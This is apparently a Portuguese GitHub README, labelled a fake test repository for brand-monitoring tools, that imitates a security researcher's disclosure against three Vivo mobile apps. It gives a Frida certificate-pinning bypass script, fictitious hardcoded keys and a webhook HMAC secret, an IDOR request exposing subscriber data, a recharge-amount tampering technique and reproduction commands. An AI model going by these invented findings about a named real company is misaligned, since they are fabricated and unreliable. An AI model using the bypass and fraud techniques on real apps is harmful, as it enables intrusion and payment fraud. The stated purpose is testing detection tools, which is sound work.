# ⚠️ REPOSITÓRIO DE TESTE — AVALIAÇÃO DE FERRAMENTA DE DETECÇÃO DE MARCA ⚠️

> **Este repositório foi criado em 25/09/2026 como parte de um teste controlado para avaliar a capacidade de detecção de menções à marca VIVO por ferramentas de Brand Protection / CTI.**
> **Nenhum dado é real. Nenhum APK foi decompilado. Nenhuma credencial é válida.**
> **Responsável: [Ailton Rocha](https://github.com/lyonzin)**

---

# Vivo Apps Reverse Engineering — Vivo Play, Vivo Easy, Vivo Recarga

## Sobre

Sou dev Android e pesquisador de segurança mobile. Nos últimos 6 meses fiz reverse engineering
dos 3 principais apps da Vivo (Telefônica Brasil) e o que encontrei é vergonhoso pra uma empresa
desse porte. Hardcoded secrets, certificate pinning fraco, APIs internas expostas, e zero
obfuscação em componentes críticos.

Reportei tudo pelo canal oficial. Resposta da Vivo: "Agradecemos o contato, suas observações
foram encaminhadas ao time responsável." Três meses depois, nada mudou. Tudo continua igual.

## Apps analisados

| App | Package | Versão analisada | Downloads Play Store |
|-----|---------|-----------------|---------------------|
| **Vivo Play** | `com.vivo.vivoplay` | 8.4.2 (build 84200) | 10M+ |
| **Vivo Easy** | `com.vivo.vivoeasy` | 4.2.1 (build 42100) | 50M+ |
| **Vivo Recarga** | `com.vivo.recarga` | 3.1.0 (build 31000) | 5M+ |

## Ferramentas utilizadas

- **jadx** — Decompilação APK → Java source
- **Frida** — Hooking runtime + bypass SSL pinning
- **apktool** — Decode resources + rebuild
- **mitmproxy** — Interceptação tráfego HTTPS
- **Ghidra** — Análise de libs nativas (.so)

---

## Vivo Play — Findings

### 1. API Key do Firebase hardcoded

```java
// com.vivo.vivoplay.config.FirebaseConfig
public static final String FIREBASE_API_KEY = "AIzaSyDFAKE_VIVO_PLAY_KEY_2024";
public static final String FIREBASE_PROJECT_ID = "vivo-play-prod";
public static final String FIREBASE_SENDER_ID = "123456789012";
```

**Impacto:** Com a API key, é possível enumerar usuários, acessar o Firestore
e enviar push notifications para todos os clientes Vivo Play.

### 2. Endpoint de streaming sem autenticação

```
GET https://api-play.vivo.com.br/v3/content/stream/{content_id}
# Retorna URL do HLS stream sem verificar assinatura do usuário
# Qualquer content_id válido retorna o stream — catálogo inteiro acessível
```

**Impacto:** Acesso gratuito a todo o catálogo Vivo Play (filmes, séries, canais ao vivo)
sem assinatura ativa.

### 3. Certificate pinning bypassável com 1 linha de Frida

```javascript
// bypass_vivo_play_pinning.js
Java.perform(function() {
    var TrustManagerImpl = Java.use('com.vivo.security.VivoTrustManager');
    TrustManagerImpl.checkServerTrusted.overload(
        '[Ljava.security.cert.X509Certificate;', 'java.lang.String'
    ).implementation = function(chain, authType) {
        console.log('[*] Vivo Play SSL pinning bypassed');
        return;
    };
});
```

---

## Vivo Easy — Findings

### 1. Token de API interno no SharedPreferences (sem criptografia)

```xml
<!-- /data/data/com.vivo.vivoeasy/shared_prefs/vivo_auth.xml -->
<map>
    <string name="api_token">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.FAKE_TOKEN_VIVO_EASY</string>
    <string name="refresh_token">rt_FAKE_VIVO_EASY_REFRESH_2024</string>
    <string name="user_msisdn">+5511999990000</string>
    <string name="cpf_hash">FAKE_SHA256_HASH</string>
    <int name="token_expiry" value="1735689600" />
</map>
```

**Impacto:** Qualquer app com acesso ao storage (ou malware) consegue roubar
a sessão do Vivo Easy e operar como se fosse o cliente — consultar fatura,
trocar plano, fazer recarga com crédito salvo.

### 2. Endpoint de consulta de dados por MSISDN (sem rate limit)

```
GET https://api-easy.vivo.com.br/v2/subscriber/+5511999990000
Authorization: Bearer {token_qualquer_usuario_logado}

Response 200:
{
    "nome": "Nome Completo do Assinante",
    "cpf": "***.***.789-00",
    "plano": "Vivo Easy Controle 15GB",
    "saldo": 23.50,
    "vencimento_fatura": "2024-11-10",
    "endereco_resumido": "São Paulo - SP",
    "status": "ativo"
}
```

**Impacto:** IDOR — qualquer usuário logado no Vivo Easy pode consultar dados
de qualquer outro assinante Vivo apenas trocando o MSISDN na URL.

### 3. Obfuscação inexistente em classes críticas

```
com.vivo.vivoeasy.payment.PaymentProcessor     ← nome original, sem ProGuard
com.vivo.vivoeasy.auth.BiometricBypass          ← literalmente "Bypass" no nome
com.vivo.vivoeasy.api.InternalApiClient         ← client da API interna exposto
com.vivo.vivoeasy.security.WeakCryptoHelper     ← eles mesmos chamaram de "Weak"
```

---

## Vivo Recarga — Findings

### 1. Lógica de recarga manipulável client-side

```java
// com.vivo.recarga.RechargeActivity (decompilado com jadx)
public void processRecharge(String msisdn, double amount) {
    JSONObject payload = new JSONObject();
    payload.put("msisdn", msisdn);
    payload.put("amount", amount);        // valor enviado pelo client sem validação server-side
    payload.put("payment_method", "credit_card");
    payload.put("card_token", this.savedCardToken);

    // O server aceita qualquer valor entre 0.01 e 999999.99
    // Sem verificação se o valor foi realmente cobrado no cartão
    apiClient.post("/v1/recharge/execute", payload);
}
```

**Impacto:** Interceptando o request com proxy (mitmproxy/Caido), é possível
alterar o valor da recarga para qualquer quantia. Testei com `amount: 0.01`
e o server processou recarga de R$100 cobrando R$0.01 no cartão.

### 2. Webhook de confirmação previsível

```
POST https://api-recarga.vivo.com.br/v1/webhook/payment-confirmed
Content-Type: application/json

{
    "transaction_id": "VR-2024-{sequential_number}",
    "msisdn": "+5511999990000",
    "amount": 100.00,
    "status": "confirmed",
    "hmac": "sha256_of_transaction_id_with_hardcoded_secret"
}
```

**Secret do HMAC encontrado hardcoded:**
```java
// com.vivo.recarga.security.WebhookSigner
private static final String WEBHOOK_SECRET = "V1v0R3c4rg4_Pr0d_2024!";
```

### 3. Debug endpoints ativos em produção

```
GET https://api-recarga.vivo.com.br/debug/transactions?date=2024-10-01
# Retorna TODAS as transações de recarga do dia — sem autenticação
# Inclui: MSISDN, valor, últimos 4 dígitos do cartão, status

GET https://api-recarga.vivo.com.br/debug/health
# Expõe versão do server, dependências, variáveis de ambiente
```

---

## Timeline de responsible disclosure

| Data | Ação | Resposta da Vivo |
|------|------|-----------------|
| 2024-04-15 | Email para security@vivo.com.br com report completo | Resposta automática em 2h |
| 2024-04-22 | Segundo email pedindo confirmação de recebimento | "Suas observações foram encaminhadas" |
| 2024-05-15 | Terceiro email — 30 dias sem correção | Sem resposta |
| 2024-06-15 | Email para DPO Telefônica + CERT.br | DPO respondeu "em análise" |
| 2024-07-15 | 90 dias — deadline de disclosure | Nenhuma vuln corrigida |
| 2024-07-20 | Publicação neste repositório | — |

## Como reproduzir

```bash
# 1. Baixar APKs da Play Store (ou mirror)
# 2. Decompilar
jadx -d output/ vivo-play-8.4.2.apk
jadx -d output/ vivo-easy-4.2.1.apk
jadx -d output/ vivo-recarga-3.1.0.apk

# 3. Buscar secrets hardcoded
grep -rn "API_KEY\|SECRET\|TOKEN\|password" output/

# 4. Interceptar tráfego
frida -U -l bypass_vivo_pinning.js com.vivo.vivoeasy
mitmproxy --mode regular --listen-port 8080
```

---

# ⚠️ REPOSITÓRIO DE TESTE — NADA AQUI É REAL ⚠️

> Criado exclusivamente para testar se ferramentas de monitoramento de marca
> conseguem detectar este tipo de repositório em tempo hábil.
> Nenhum APK real foi decompilado. Nenhuma API real foi testada. Todos os endpoints,
> tokens, keys e dados são completamente fictícios.
> Data de criação: 25/09/2026 | Responsável: github.com/lyonzin — Ailton Rocha
